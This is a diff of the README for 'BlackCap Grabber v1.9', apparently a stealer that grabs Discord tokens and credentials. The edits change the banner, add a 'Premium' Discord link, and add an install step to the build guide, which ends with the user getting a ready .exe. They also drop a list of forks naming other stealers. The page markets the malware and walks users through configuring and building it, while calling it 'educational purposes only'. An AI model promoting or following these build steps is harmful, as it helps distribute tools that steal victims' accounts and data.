@@ -1,16 +1,21 @@
-# 🔰 BlackCap Grabber v1.9
+# BlackCap Grabber v1.9
 
 ![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png)
 
 
 
-##### [:gem: Premium](https://discord.gg/blackcap)
+##### [:gem: Premium](https://discord.gg/blackcap) - [💡 Features](https://github.com/BlackCap-Grabber/Arizona#features) 
+
+
+
 
 
 
 <h1 align="center">
-  🔰 DISCORD.GG/BLACKCAP
+  BlackCap Grabber 🔰
+  DISCORD.GG/BLACKCAP
 </h1>
+
 
 <h2 align="center">
   BlackCap Grabber was made with
@@ -77,9 +82,10 @@ BlackCap was made for educational purposes, therefor all consequences caused by 
 ## <a id="setup"></a> 📁 〢 Setting up BlackCap
 
 1. Install [Python](https://www.python.org/downloads/)
-2. Edit the Configuration [index.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/index.py#L52)
-3. Double Click on [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/build.bat) to build
-4. You have your .exe file enjoy :)
+2. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
+3. Edit the Configuration [index.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/index.py#L52)
+4. Double Click on [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/build.bat) to build
+5. You have your .exe file enjoy :)
 
 
 
@@ -160,10 +166,6 @@ v1.9 ⋮ 2022-26-10
 - Nono1337
 - Irax212
 - Shamroks
-
-### Forks
-- PirateStealer
-- Hazard Grabber
 
 # Terms
 - [x] Educational purpose only
